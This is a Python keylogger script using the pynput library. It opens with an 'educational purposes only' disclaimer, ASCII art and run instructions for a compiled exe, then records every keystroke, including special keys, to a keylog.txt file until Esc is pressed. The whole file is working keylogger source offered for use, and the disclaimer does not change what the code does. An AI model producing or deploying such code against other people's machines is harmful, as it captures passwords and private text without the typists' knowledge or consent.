import pynput
from pynput.keyboard import Key, Listener

# Display disclaimer and ASCII art
def display_disclaimer():
    print("""
DISCLAIMER:
***This keylogger is created for educational purposes and ethical use only. 
It should only be used in controlled environments, such as testing on 
your own systems or with the explicit consent of the system owner. 
Unauthorized use of this script is illegal and punishable under applicable laws.***

I AM NOT RESPONSIBLE FOR MISS USE.

Instructions:

1. Put the exe in a folder.

2. Launch exe.

3. Type anything, it will start logging to an keylog txt file.

                 -=====-                         -=====-
                _..._                           _..._
              .~     `~.                     .~`     ~.
      ,_     /          }                   {          \     _,
     ,_\'--, \   _.'`~~/                     \~~`'._   / ,--'/_,
      \'--,_`{_,}    -(                       )-    {,_}`_,--'/
       '.`-.`\;--,___.'_                     _'.___,--;/`.-`.'
         '._`/    |_ _{@}                   {@}_ _|    \`_.'
            /     ` |-';/           _       \;'-| `     \
           /   \    /  |       _   {@}_      |  \    /   \
          /     '--;_       _ {@}  _Y{@}        _;--'     \
         _\          `\    {@}\Y/_{@} Y/      /`          /_
        / |`-.___.    /    \Y/\|{@}Y/\|//     \    .___,-'| \
^^^^`--`------'`--`^^^^^^^^^^^^^^^^^^^^^^^^^`--`'------`--`^^^^^^^
    """)

# Call the disclaimer function
display_disclaimer()

# File to store logged keys
log_file = "keylog.txt"

# Function to write keys to file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            # Remove quotes around keys
            key = str(key).replace("'", "")
            if key == "Key.space":
                file.write(" ")
                print("Space")
            elif key == "Key.enter":
                file.write("\n")
                print("Enter")
            elif key.startswith("Key"):
                file.write(f"[{key}]")  # Special keys in brackets
                print(f"Special Key: {key}")
            else:
                file.write(key)
                print(f"Key pressed: {key}")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Listener function for key press
def on_press(key):
    write_to_file(key)

# Listener function for key release
def on_release(key):
    if key == Key.esc:
        # Stop listener with the Esc key
        return False

# Start listening for keypresses
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error starting listener: {e}")
